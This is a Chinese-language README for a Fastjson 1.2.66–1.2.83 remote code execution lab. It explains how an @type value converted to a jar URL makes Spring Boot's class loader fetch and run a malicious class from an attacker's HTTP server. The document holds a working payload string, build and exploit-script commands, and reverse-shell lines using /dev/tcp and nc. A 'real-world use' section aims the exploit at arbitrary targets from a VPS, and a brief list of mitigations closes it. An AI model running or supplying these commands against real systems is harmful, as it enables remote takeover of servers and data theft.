# Fastjson 1.2.83 RCE 漏洞测试环境

## 漏洞概述

Fastjson 1.2.68 ~ 1.2.83 的 `checkAutoType` 中存在 `@JSONType` 注解探测路径漏洞。
攻击者构造特殊 `@type` 值，利用 `typeName.replace('.', '/')` 转换为 jar URL，
Spring Boot `LaunchedURLClassLoader` 远程加载恶意类并执行 `<clinit>` 完成 RCE。

**无需 autoTypeSupport=true，无需第三方依赖，仅需 safeMode 未启用（默认）。**

## 利用条件

| 条件 | 说明 |
|------|------|
| Fastjson | 1.2.66 ~ 1.2.83 |
| 部署方式 | Spring Boot FatJar（`java -jar`）|
| JDK | JDK 8 完整 RCE；JDK 9+ 仅 SSRF |
| 网络 | 目标能访问攻击者 HTTP 服务 |
| autoType | 不需要开启 |

## 快速使用

### 1. 一键构建

```bash
bash scripts/build.sh <LHOST> <LPORT> <CMD>
```

参数说明：
- `LHOST` — 攻击者 IP（目标能访问到的 IP）
- `LPORT` — 攻击者 HTTP 托管端口（默认 19090）
- `CMD` — 要执行的命令

示例：
```bash
# macOS 弹计算器
bash scripts/build.sh 127.0.0.1 19090 "open -a Calculator"

# Windows 弹计算器
bash scripts/build.sh 192.168.0.100 19090 "calc"

# Linux 反弹 shell
bash scripts/build.sh 1.2.3.4 19090 "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1"
```

### 2. 启动靶场

```bash
java -jar target/fastjson-rce-env-1.0.0.jar
```

浏览器访问 `http://127.0.0.1:18080/` 可看到测试页面。

### 3. 发送 Exploit

```bash
python3 poc/exploit.py <LHOST> <LPORT> <TARGET_URL> [ENDPOINT]
```

示例：
```bash
python3 poc/exploit.py 127.0.0.1 19090 http://127.0.0.1:18080
python3 poc/exploit.py 192.168.0.100 19090 http://192.168.0.102:18080
```

## 接口说明

| 接口 | 方法 | 说明 |
|------|------|------|
| `/` | GET | 浏览器测试页面（HTML） |
| `/info` | GET | 环境信息（JSON） |
| `/parse` | POST | JSON 解析接口（漏洞触发点）|

## 漏洞原理

```
checkAutoType 中的 @JSONType 探测代码:
  String resource = typeName.replace('.', '/') + ".class";
  is = defaultClassLoader.getResourceAsStream(resource);

payload: {"@type":"jar:http:..2130706433:19090.probe!.POC","x":1}
                          ↓ replace('.', '/')
resource: "jar:http://127.0.0.1:19090/probe!/POC.class"
                          ↓ LaunchedURLClassLoader
远程下载 jar → defineClass → <clinit> 执行 → RCE
```

IP 使用整数格式是因为 `.` 会被替换为 `/`，整数 IP 不含 `.`。
`2130706433` = `127.0.0.1` 的整数表示。

## 项目结构

```
├── pom.xml
├── README.md
├── scripts/
│   └── build.sh                # 一键构建
├── poc/
│   ├── GenProbe.java           # 恶意类生成器(ASM字节码)
│   ├── exploit.py              # 利用脚本
│   ├── lib/                    # asm-9.6.jar, fastjson-1.2.83.jar
│   ├── probe.jar               # 生成的恶意 jar
│   └── www/probe               # HTTP 托管文件
└── src/main/java/com/vuln/fastjson/
    ├── Application.java
    └── ParseController.java
```

## 实战利用

```bash
# VPS 上
bash scripts/build.sh VPS_IP 19090 "bash -i >& /dev/tcp/VPS_IP/4444 0>&1"
python3 poc/exploit.py VPS_IP 19090 http://目标:端口 /任意json接口

# 另一个终端接收 shell
nc -lvnp 4444
```

## 防护措施

1. 启用 SafeMode: `-Dfastjson.parser.safeMode=true`
2. 升级到 fastjson2
3. 出口网络管控（阻止应用访问外部 HTTP）
4. 使用 JDK 9+（阻断 defineClass，但 SSRF 仍存在）
